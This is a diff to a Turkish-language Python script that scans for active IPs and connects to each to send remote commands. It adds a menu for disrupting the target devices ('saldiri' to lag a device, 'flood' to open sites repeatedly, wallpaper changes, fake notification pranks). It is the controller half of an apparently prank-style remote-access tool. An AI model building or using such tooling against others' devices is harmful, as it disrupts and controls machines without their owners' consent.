@@ -19,27 +19,45 @@ def client_handler(ip, port):
         s = socket.socket()
         s.settimeout(3)
         s.connect((ip, port))
-        print(f"[✓] Bağlantı başarılı: {ip}")
+        print(f"\n[✓] Bağlantı başarılı: {ip}")
 
         cihaz = s.recv(1024).decode()
-        print(f"[✓] Cihaz: {cihaz}")
+        print(f"[✓] Cihaz: {cihaz} ({ip})")
+
+        print("""
+[ Komutlar ]
+1. google             → Google aç
+2. saldiri            → Cihazı kasar
+3. dosya              → saka.txt oluştur
+4. arkaplan <url>     → Arka plan değiştir
+5. saka <mesaj>       → Bildirim şakası gönder
+6. flood              → Arka arkaya site açar
+7. exit               → Bağlantıyı kapat
+        """)
 
         while True:
-            komut = input("Komut >> ")
-            if komut == "exit":
-                s.send(b"exit")
-                break
+            komut = input(f"Komut gönder [{ip}] >> ").strip()
+            if not komut:
+                continue
             s.send(komut.encode())
-            print(s.recv(2048).decode())
+            if komut == "exit":
+                print(f"[✓] Bağlantı kapatıldı: {ip}")
+                s.close()
+                break
+            cevap = s.recv(2048).decode()
+            print(f"[{ip}] {cevap}")
 
-        s.close()
     except Exception as e:
         print(f"[!] {ip} bağlantı hatası: {e}")
 
 if __name__ == "__main__":
-    port = int(input("Port gir >> "))
-    aktifler = get_active_ips()
-    print(f"[✓] Aktif IP'ler: {aktifler}")
+    try:
+        port = int(input("Port gir >> "))
+        aktifler = get_active_ips()
+        print(f"[✓] Aktif IP'ler: {aktifler}")
 
-    for ip in aktifler:
-        threading.Thread(target=client_handler, args=(ip, port)).start()
+        for ip in aktifler:
+            threading.Thread(target=client_handler, args=(ip, port)).start()
+
+    except Exception as e:
+        print(f"[!] Hata oluştu: {e}")
